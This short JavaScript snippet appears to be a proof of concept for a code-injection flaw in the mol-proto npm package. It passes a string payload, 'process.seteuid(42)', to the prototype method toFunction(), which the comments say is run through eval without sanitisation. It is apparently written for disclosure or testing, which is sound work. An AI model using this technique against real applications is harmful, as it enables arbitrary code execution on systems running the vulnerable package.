    // Load mol-proto to apply its prototype extensions
    require('mol-proto')();

    // The vulnerable `toFunction()` is attached to String.prototype.
    // We pass arbitrary JavaScript code directly as the string target.
    const payload = 'process.seteuid(42)';

    // When invoked, toFunction() executes:
    // var code = 'func = ' + 'process.seteuid(42)' + ';';
    // eval(code);
    // This bypasses all sanitization and directly executes the injected payload.
    return payload.toFunction();
